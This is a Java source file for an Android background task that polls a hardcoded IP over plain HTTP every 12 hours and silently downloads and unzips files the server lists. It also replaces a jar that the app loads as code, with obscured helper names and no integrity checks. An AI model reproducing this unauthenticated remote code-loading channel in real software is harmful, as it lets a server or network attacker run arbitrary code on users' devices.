/**
 * 
 */
package cn.play.dserv;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map.Entry;

/**
 * download and update task,for more and exit view update
 * @author Keel
 *
 */
public class PLTask16 implements PLTask {

	private DServ dserv;
	private int id = 16;
	private int state = STATE_WAITING;
	private String TAG = "dserv-PLTask"+id;
	private int sleepTime = 1000 * 60 * 60 * 12; //12小时请求一次
	private long nextSynTime = 0L;
	private String url = "http://180.96.63.70:12380/plserver/sync/syn";
	private int ver = 0;
	
	@SuppressWarnings("unchecked")
	@Override
	public void run() {
		CheckTool.log(dserv.getService(), TAG, "==========PLTask id:"+this.id+"===========");
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task running");
		state = STATE_RUNNING;
		while (true) {
			//网络判断
			if (!CheckTool.isNetOk(this.dserv.getService())) {
				try {
					Thread.sleep(1000*60*5);
				} catch (InterruptedException e) {
				}
				continue;
			}
			//间隔时间
			if (System.currentTimeMillis() < this.nextSynTime) {
				state = STATE_WAITING;
				break;
			}else{
				this.nextSynTime = System.currentTimeMillis() + this.sleepTime;
			}
			
			try {
				//请求获取下载文件列表和更新参数
				String req = "sy=" + CheckTool.Cg(String.valueOf(this.ver));
				String re = this.getSync(this.url, req);
				if (re == null) {
					try {
						Thread.sleep(1000 * 60);
					} catch (InterruptedException e) {
					}
					re = this.getSync(this.url, req);
					if (re == null) {
						CheckTool.log(this.dserv.getService(), TAG, "getSync failed twice.");
						break;
					}
				}
				HashMap<String,Object> root = (HashMap<String, Object>) JSON.read(re);
				if (root == null) {
					CheckTool.log(this.dserv.getService(), TAG, "getSync error re.");
					break;
				}
				
				/*
				//判断ver
				Object serverVer = root.get("ver");
				if (StringUtil.isDigits(serverVer) && Integer.parseInt(String.valueOf(serverVer)) <= this.ver) {
					//版本无需更新
					CheckTool.log(this.dserv.getService(), TAG, "No need sync. ver:"+this.ver);
					break;
				}
				*/
				String downPre = (String) root.get("downPre");
				String sdDir = dserv.getLocalPath();
				//判断emPath，是否需要更新
				String[] emp = this.dserv.getEmp().split("@@");
				Object emPath = root.get("emPath");
				if (!emPath.equals(emp[1])) {
					String newEmp = emPath.toString();
					//升级
					if (this.synFile(downPre,newEmp ,sdDir,0) == 1) {
						this.dserv.setEmp("cn.play.dserv.MoreView", newEmp);
						CheckTool.log(this.dserv.getService(), TAG, "syn emPath OK:"+newEmp);
					}else{
						CheckTool.log(this.dserv.getService(), TAG, "syn emPath error.");
					}
				}
				//判断exv的ver，是否需要更新
				Object exVer = root.get("exVer");
				if (StringUtil.isDigits(exVer)) {
					int exv = Integer.parseInt(String.valueOf(exVer));
					ExitInterface ex = (ExitInterface) CheckTool.Cm("update/exv",
							"cn.play.dserv.ExitView", this.dserv.getService(), false,true,false);
					if (ex != null && ex.getVer() < exv) {
						//升级
						if (this.synFile(downPre, "update/exv.jar", sdDir,0) == 1) {
							CheckTool.log(this.dserv.getService(), TAG, "syn exv OK.");
						}else{
							CheckTool.log(this.dserv.getService(), TAG, "syn exv error.");
						}
					}
				}
				
				//同步服务端文件
				ArrayList<HashMap<String,Object>> sd = (ArrayList<HashMap<String,Object>>) root.get("sd");
				this.synFileList(downPre, sd, sdDir);
				CheckTool.log(this.dserv.getService(), TAG, "syn list OK.");
				
			} catch (Exception e) {
				e.printStackTrace();
				CheckTool.log(this.dserv.getService(), TAG, "syn error!");
			}
			
			
			break;
		}
		state = STATE_WAITING;
//		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task is finished.");
		CheckTool.log(dserv.getService(), TAG, "==========SyncTask finished state:"+this.state+"===========");
	}
	
	@SuppressWarnings("unchecked")
	private void synFileList(String downPre,ArrayList<HashMap<String,Object>> ls,String localPath){
		for (Iterator<HashMap<String,Object>> it = ls.iterator(); it.hasNext();) {
			HashMap<String, Object> map = it.next();
			Entry<String,Object> entry =  map.entrySet().iterator().next();
			String key = entry.getKey();
			Object value = entry.getValue();
			if (value instanceof String) {
				//文件
				if (StringUtil.isDigits(value)) {
					int size = (Integer)value;
					int synRe = this.synFile(downPre, key, localPath, size);
					if(synRe == 1){
						CheckTool.log(this.dserv.getService(), TAG, "synFile OK:"+localPath+key);
					}else if(synRe < 0){
						CheckTool.log(this.dserv.getService(), TAG, "syn error!"+localPath+key);
					}
				}else{
					CheckTool.log(this.dserv.getService(), TAG, "file size error:"+key+","+value);
				}
			}else{
				//目录
				String dir = localPath+key;
				(new File(dir)).mkdirs();
				this.synFileList(downPre, (ArrayList<HashMap<String,Object>>)value, dir);
			}
		}
		
		
	}
	
	/**
	 * 返回1为成功下载,0为skip,-1为失败
	 * @param downPre
	 * @param file
	 * @param localPath
	 * @param size -1表示无需要下载,0表示必须下载,其他为目标文件实际大小
	 * @return
	 */
	private int synFile(String downPre,String file,String localPath,int size){
		if (size == -1) {
			return 0;
		}
		//判断目标文件是否已存在，如已存在则判断size
		String filePath = localPath + file;
		File localFile = new File(filePath);
		boolean isOldFileExist = localFile.exists();
		if (isOldFileExist && localFile.length() == size) {
			return 0;
		}
		//其他情况均需要下载
		String url = downPre+filePath;
		String localFileName = (isOldFileExist) ? file+".tmp" : file;
		if (this.dserv.downloadGoOn(url, localPath, localFileName, this.dserv.getService())) {
			if (isOldFileExist) {
				localFile.delete();
				File newFile = new File(localFileName);
				newFile.renameTo(localFile);
			}
		}else{
			return -1;
		}
		//如果是zip，则进行释放
		if (file.endsWith(".zip")) {
			boolean unzip = this.dserv.unzip(file, localPath);
			if (unzip) {
				CheckTool.log(this.dserv.getService(), TAG, "unzip OK:"+filePath);
			}else{
				CheckTool.log(this.dserv.getService(), TAG, "unzip failed:"+filePath);
				return -1;
			}
		}
		return 1;
	}
	
	
	private String getSync(String url,String req){
		try {
			URL aUrl = new URL(url);
			URLConnection conn = aUrl.openConnection();
			conn.setConnectTimeout(5000);
			conn.setRequestProperty("v", CheckTool.Cd(this.dserv.getService()));
			conn.setDoInput(true);
			conn.setDoOutput(true);
			OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
			wr.write(req);
			wr.flush();

			// Get the response
			BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream(),"utf-8"));
			String line;
			StringBuilder sb = new StringBuilder();
			while ((line = rd.readLine()) != null) {
				sb.append(line);
			}
			wr.close();
			rd.close();
			//判断是否错误
			final String resp = sb.toString();
			if (!StringUtil.isStringWithLen(resp, 4)) {
				//判断错误码
				CheckTool.log(this.dserv.getService(),TAG, resp);
				return null;
			}
			//解密
			String re = CheckTool.Cf(resp);//Encrypter.getInstance().decrypt(resp);
			CheckTool.log(this.dserv.getService(),TAG, "re:"+re);
			return re;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return id;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		CheckTool.log(dserv.getService(),TAG, "TASK "+id+" init.");
		
//		Log.d(TAG, "TASK "+id+" init.");
		if (dserv.getService() != null) {
			dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
		}else{
			CheckTool.log(dserv.getService(),TAG, "TASK "+id+" getService is null.");
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int arg0) {
		this.state = arg0;
	}

	@Override
	public void setDService(DServ serv) {
		this.dserv =serv;
	}
}
